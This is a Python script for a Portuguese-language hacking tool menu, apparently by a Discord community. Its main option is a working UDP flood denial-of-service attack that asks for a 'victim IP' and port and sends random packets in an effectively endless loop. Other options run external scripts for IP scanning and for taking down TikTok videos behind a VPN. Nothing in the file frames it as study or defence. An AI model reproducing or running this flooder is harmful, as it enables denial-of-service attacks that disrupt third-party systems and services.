import socket, random, time, http.client, json, os, subprocess
from colorama import Fore, Back, Style 
startTime = time.time()

def painel():
  print(Fore.RED + """
 ______   _______  _______  _           _______  _       _________ _______  _       _________
(  __  \ (  ____ \(  ____ \| \    /\   (  ____ \( \      \__   __/(  ____ \( (    /|\__   __/
| (  \  )| (    \/| (    \/|  \  / /   | (    \/| (         ) (   | (    \/|  \  ( |   ) (   
| |   ) || (__    | (_____ |  (_/ /    | |      | |         | |   | (__    |   \ | |   | |   
| |   | ||  __)   (_____  )|   _ (     | |      | |         | |   |  __)   | (\ \) |   | |   
| |   ) || (            ) ||  ( \ \    | |      | |         | |   | (      | | \   |   | |   
| (__/  )| (____/\/\____) ||  /  \ \   | (____/\| (____/\___) (___| (____/\| )  \  |   | |   
(______/ (_______/\_______)|_/    \/   (_______/(_______/\_______/(_______/|/    )_)   )_( 


  Discord ┃ https://discord.gg/desk
  
  Youtube ┃ https://www.youtube.com/c/DeskCommunity     
  
  
  """)
  print(Fore.RED + 'Developed by barbosa and mhzin')
  print('')

painel()
print('1 - DDOS \n2 - IP SCANNER \n3 - DERRUBAR VIDEO TIKTOK ( UTILIZE VPN )')
select = int(input('\nEscolha uma opção: '))

if select == 1:
  os.system('cls' if os.name == 'nt' else 'clear')
  
  print("""
___  ____ ____ _  _     ___  ___  ____ ____ 
|  \ |___ [__  |_/      |  \ |  \ |  | [__  
|__/ |___ ___] | \_     |__/ |__/ |__| ___] 


  Discord ┃ https://discord.gg/desk
  
  Youtube ┃ https://www.youtube.com/c/DeskCommunity     
  
  
  """)

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
  ip = input("Ip da Vítima: ")
  port = int(input("Porta: "))
  sleep = float(input("Tempo: "))
  
  s.connect((ip, port))
  
  for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Enviado: {i}", end='\r')
    time.sleep(sleep)
    

if select ==2:
  os.system('cls' if os.name == 'nt' else 'clear')

  exec(open("ipscanner.py").read())

elif select ==3:
  os.system('cls' if os.name == 'nt' else 'clear')
  
  exec(open("tiktok.py").read())

else:
  os.system('cls' if os.name == 'nt' else 'clear')
  print('Opção Invalida!')